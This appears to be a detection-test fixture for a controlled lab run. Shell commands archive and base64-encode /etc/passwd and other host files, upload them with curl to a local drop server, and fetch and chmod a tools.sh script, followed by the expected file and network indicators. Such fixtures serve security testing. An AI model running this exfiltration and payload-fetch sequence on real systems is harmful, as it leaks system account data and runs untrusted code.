# LIR-007: Staged upload to a local drop server (controlled lab run)
mkdir -p /tmp/lab-lynx/.drop
tar -czf /tmp/lab-lynx/.drop/hostdata.tgz /etc/hostname /etc/hosts /etc/passwd
gzip -c /tmp/lab-lynx/.drop/hostdata.tgz > /tmp/lab-lynx/.drop/hostdata.tgz.gz
base64 /etc/passwd | head -c 400 > /tmp/lab-lynx/.drop/passwd.b64
curl -s -X POST --data-binary @/tmp/lab-lynx/.drop/passwd.b64 http://127.0.0.1:8484/upload
curl -s -X POST --data-binary @/tmp/lab-lynx/.drop/hostdata.tgz.gz http://127.0.0.1:8484/upload
wget -q http://127.0.0.1:8484/tools.sh -O /tmp/lab-lynx/.drop/tools.sh
chmod +x /tmp/lab-lynx/.drop/tools.sh
FILE:/tmp/lab-lynx/.drop/hostdata.tgz:creation
FILE:/tmp/lab-lynx/.drop/hostdata.tgz.gz:creation
FILE:/tmp/lab-lynx/.drop/passwd.b64:creation
FILE:/tmp/lab-lynx/.drop/tools.sh:creation
NET:127.0.0.1:0:127.0.0.1:8484:curl
